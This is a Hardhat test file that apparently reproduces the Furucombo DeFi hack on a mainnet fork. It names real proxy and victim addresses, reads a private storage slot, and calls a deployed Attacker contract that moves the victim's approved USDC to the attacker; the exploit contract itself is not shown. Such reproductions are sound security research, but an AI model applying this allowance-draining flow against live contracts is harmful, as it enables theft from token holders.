import { expect } from "chai";
import { BigNumber, Contract, ContractTransaction, Signer } from "ethers";
import { ethers } from "hardhat";
//
// eslint-disable-next-line node/no-extraneous-import, no-unused-vars
import _ from "lodash";
// import { forkFrom } from "./utils/fork";
// import { getAttackerContractName } from "./utils/fs";

let accounts: Signer[];
let attackerEOA: Signer;
let attacker: Contract;
let furucomboProxy: Contract;
let aaveV2Proxy: Contract;
let usdc: Contract;
// eslint-disable-next-line no-unused-vars
let tx: ContractTransaction;

before(async () => {
  accounts = await ethers.getSigners();
  [attackerEOA] = accounts;

  furucomboProxy = await ethers.getContractAt(
    `IProxy`,
    `0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f`
  );
  aaveV2Proxy = await ethers.getContractAt(
    `IProxy`,
    `0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9`
  );
  usdc = await ethers.getContractAt(
    `contracts/interfaces/IERC20.sol:IERC20`,
    `0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48`
  );

  const attackerFactory = await ethers.getContractFactory(
    `contracts/Attacker.sol:Attacker`,
    attackerEOA
  );
  attacker = await attackerFactory.deploy();
});

describe("Furucombo Hack", function () {
  // USDC victim of this hack transaction:
  // https://etherscan.io/tx/0x8bf64bd802d039d03c63bf3614afc042f345e158ea0814c74be4b5b14436afb9
  const victimAddress = `0x13f6f084e5faded2276def5149e71811a7abeb69`;
  let victimBalance: BigNumber;

  it("checks allowances", async function () {
    // check that a victim approved the furucombo proxy
    victimBalance = await usdc.balanceOf(victimAddress);
    const allowance = await usdc.allowance(
      victimAddress,
      furucomboProxy.address
    );
    console.log(
      `Victim USDC balance: ${ethers.utils.formatUnits(
        victimBalance,
        6
      )}\nAllowance of Furucombo Proxy: ${allowance.toHexString()}`
    );
  });

  it("checks _isValid(aaveV2Proxy)", async function () {
    // is a private storage field, need to read it raw
    const HANDLER_REGISTRY_SLOT = `0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19`;
    const registryAddr = BigNumber.from(
      await ethers.provider.getStorageAt(
        furucomboProxy.address,
        HANDLER_REGISTRY_SLOT
      )
    ).toHexString();
    console.log(`Registry address: ${registryAddr}`);
    const registry = await ethers.getContractAt(`IRegistry`, registryAddr);
    const isValid = await registry.isValid(aaveV2Proxy.address);
    // eslint-disable-next-line no-unused-expressions
    expect(isValid, "!isValid").to.be.true;
  });

  it("performs the attack", async function () {
    tx = await attacker.setup();
    tx = await attacker.attack(usdc.address, victimAddress);
    const attackerBalance = await usdc.balanceOf(
      await attackerEOA.getAddress()
    );
    console.log(victimBalance.toString());
    expect(attackerBalance.toString(), "attacker wrong balance").to.equal(
      victimBalance.toString()
    );
  });
});

// describe("Attacker", function () {
//   it("Should attack", async function () {
//     const Attacker = await ethers.getContractFactory("Attacker");
//     const attacker = await Attacker.deploy();
//     await attacker.deployed();

//     await attacker.attack();
//   });
// });
